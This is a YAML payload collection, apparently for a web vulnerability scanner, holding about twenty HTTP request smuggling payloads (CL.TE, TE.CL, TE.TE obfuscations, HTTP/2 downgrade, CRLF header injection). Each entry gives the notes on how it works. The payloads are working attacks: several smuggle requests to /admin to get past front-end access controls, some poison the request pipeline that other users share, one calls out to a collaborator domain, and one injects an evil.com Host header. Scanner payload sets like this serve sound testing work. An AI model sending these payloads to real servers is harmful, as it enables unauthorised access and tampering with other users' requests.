defaults:
  vuln_type: request_smuggling
  encoding: raw
  source: ensphere

payloads:
  # ============================================================
  # CL.TE — Front-end uses Content-Length, back-end uses Transfer-Encoding
  # ============================================================
  - technique: cl_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
    placeholders: [TARGET]
    notes: "CL.TE basic detection. The front-end uses Content-Length (6 bytes = '0\\r\\n\\r\\nX'), forwarding the entire body. The back-end uses Transfer-Encoding: chunked, sees chunk size 0 (end), and treats 'X' as the start of the next request. A delayed response or timeout confirms the vulnerability."
    tags: [cl_te, basic, detection]

  - technique: cl_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
    placeholders: [TARGET]
    notes: "CL.TE smuggled prefix. The back-end interprets 'SMUGGLED' as the beginning of the next request. Follow with a normal request to see if the response is influenced by the smuggled prefix."
    tags: [cl_te, prefix, smuggle]

  - technique: cl_te
    injection_surface: header
    evidence_type: response_diff
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 41\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
    placeholders: [TARGET]
    notes: "CL.TE request hijack to /admin. The smuggled portion is interpreted as a separate GET /admin request by the back-end, potentially bypassing front-end access controls that only check the initial POST."
    tags: [cl_te, admin_access, acl_bypass]

  - technique: cl_te
    injection_surface: header
    evidence_type: content_match
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 70\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 5\r\n\r\nx=1"
    placeholders: [TARGET]
    notes: "CL.TE confirm via 404. Smuggle a request for a non-existent path. If the next legitimate user request returns a 404, it confirms the smuggled request poisoned the pipeline."
    tags: [cl_te, confirmation, pipeline_poison]

  # ============================================================
  # TE.CL — Front-end uses Transfer-Encoding, back-end uses Content-Length
  # ============================================================
  - technique: te_cl
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
    placeholders: [TARGET]
    notes: "TE.CL basic detection. The front-end processes Transfer-Encoding (chunked), forwarding all chunks. The back-end uses Content-Length: 3 (reads '8\\r\\n'), leaving the rest as the next request. A timeout or unexpected response confirms TE.CL."
    tags: [te_cl, basic, detection]

  - technique: te_cl
    injection_surface: header
    evidence_type: response_diff
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n61\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 10\r\n\r\nx=SMUGGLED\r\n0\r\n\r\n"
    placeholders: [TARGET]
    notes: "TE.CL smuggled request to /admin. The back-end reads only 3 bytes of the body, leaving the smuggled GET /admin as a separate request in the pipeline."
    tags: [te_cl, admin_access, acl_bypass]

  - technique: te_cl
    injection_surface: header
    evidence_type: callback_hit
    risk: 4
    payload: "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n6e\r\nGET http://COLLAB_DOMAIN/ HTTP/1.1\r\nHost: COLLAB_DOMAIN\r\nContent-Length: 10\r\n\r\nx=SMUGGLED\r\n0\r\n\r\n"
    placeholders: [TARGET, COLLAB_DOMAIN]
    notes: "TE.CL with OOB confirmation. Smuggle a request to a collaborator domain. A DNS/HTTP hit on the collaborator confirms the smuggled request was processed."
    tags: [te_cl, oob, collaborator, confirmation]

  # ============================================================
  # TE.TE — Both support Transfer-Encoding, but obfuscation confuses one
  # ============================================================
  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding: xchunked"
    notes: "TE.TE obfuscation: xchunked. One server recognizes 'xchunked' as chunked (lenient parsing), while the other falls back to Content-Length. Pair with a CL.TE or TE.CL smuggling body."
    tags: [te_te, obfuscation, xchunked]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding : chunked"
    notes: "TE.TE obfuscation: space before colon. Some servers reject this header (fall back to CL), while others accept it. The discrepancy creates a smuggling opportunity."
    tags: [te_te, obfuscation, space_before_colon]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"
    notes: "TE.TE obfuscation: duplicate headers. One server uses the first Transfer-Encoding (chunked), the other uses the last (x, invalid, falls back to CL). Header ordering preference determines which side is exploitable."
    tags: [te_te, obfuscation, duplicate_header]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding\t: chunked"
    notes: "TE.TE obfuscation: tab before colon. Tab character in header name confuses some parsers. One server accepts it as valid TE header, the other rejects and falls back to CL."
    tags: [te_te, obfuscation, tab]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding: chunked\r\n "
    notes: "TE.TE obfuscation: trailing space on the header value. Some parsers treat the trailing whitespace as invalid and ignore the header; others trim it and process chunked encoding."
    tags: [te_te, obfuscation, trailing_space]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "X: x\r\nTransfer-Encoding: chunked"
    notes: "TE.TE obfuscation: newline prefix injection. If a prior header value is injectable, CRLF injection can add a Transfer-Encoding header that one server sees and the other does not."
    tags: [te_te, obfuscation, crlf, header_injection]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding: chunked\r\nTransfer-encoding: x"
    notes: "TE.TE obfuscation: case variation. 'Transfer-Encoding' vs 'Transfer-encoding'. Some servers deduplicate by exact header name match, others by case-insensitive match, creating inconsistency."
    tags: [te_te, obfuscation, case_variation]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding:\nchunked"
    notes: "TE.TE obfuscation: line folding (obsolete obs-fold). HTTP/1.1 historically allowed header values to continue on the next line with leading whitespace. Some servers still honor this, others do not."
    tags: [te_te, obfuscation, line_folding, obs_fold]

  - technique: te_te
    injection_surface: header
    evidence_type: timing
    risk: 4
    payload: "Transfer-Encoding: identity, chunked"
    notes: "TE.TE obfuscation: multiple encodings. Listing 'identity, chunked' may cause one parser to use chunked and the other to fall back to Content-Length due to unrecognized multi-value."
    tags: [te_te, obfuscation, multi_encoding]

  # ============================================================
  # HTTP/2 Downgrade Smuggling
  # ============================================================
  - technique: h2_downgrade
    injection_surface: header
    evidence_type: response_diff
    risk: 4
    payload: "GET / HTTP/2\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
    placeholders: [TARGET]
    notes: "H2 downgrade smuggling. If the front-end accepts HTTP/2 and translates to HTTP/1.1 for the back-end, injecting Transfer-Encoding: chunked in the H2 headers (which HTTP/2 does not normally have) can smuggle a request when the back-end interprets the downgraded HTTP/1.1."
    tags: [h2, downgrade, te_injection, admin_access]

  - technique: h2_downgrade
    injection_surface: header
    evidence_type: response_diff
    risk: 4
    payload: "GET / HTTP/2\r\nHost: TARGET\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n"
    placeholders: [TARGET]
    notes: "H2 to H1 CL/TE conflict. HTTP/2 does not use Transfer-Encoding, but if the front-end passes it through during downgrade, the back-end may interpret the body differently than the front-end intended."
    tags: [h2, downgrade, cl_te_conflict]

  - technique: h2_downgrade
    injection_surface: header
    evidence_type: response_diff
    risk: 4
    payload: "GET / HTTP/2\r\nHost: TARGET\r\nfoo: bar\r\nHost: evil.com\r\n\r\n"
    placeholders: [TARGET]
    notes: "H2 header injection via CRLF. HTTP/2 uses binary framing, but if the proxy does not sanitize header values during downgrade, CRLF sequences in a header value can inject additional HTTP/1.1 headers including a duplicate Host."
    tags: [h2, downgrade, crlf, host_injection]

  # ============================================================
  # CRLF-Based Header Injection (supporting smuggling)
  # ============================================================
  - technique: cl_te
    injection_surface: header
    evidence_type: response_diff
    risk: 3
    payload: "Foo: bar\r\nTransfer-Encoding: chunked"
    notes: "CRLF injection to add Transfer-Encoding. If any header value is reflected or injectable, inject CRLF + Transfer-Encoding: chunked to create a CL/TE discrepancy. The front-end sees the original header, the injected TE header reaches the back-end."
    tags: [crlf, te_injection, header_injection]

  - technique: cl_te
    injection_surface: header
    evidence_type: response_diff
    risk: 3
    payload: "Foo: bar\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET"
    placeholders: [TARGET]
    notes: "CRLF injection to smuggle full request. Inject a CRLF sequence that terminates the current request headers early and starts a new smuggled request to /admin."
    tags: [crlf, full_request, admin_access]
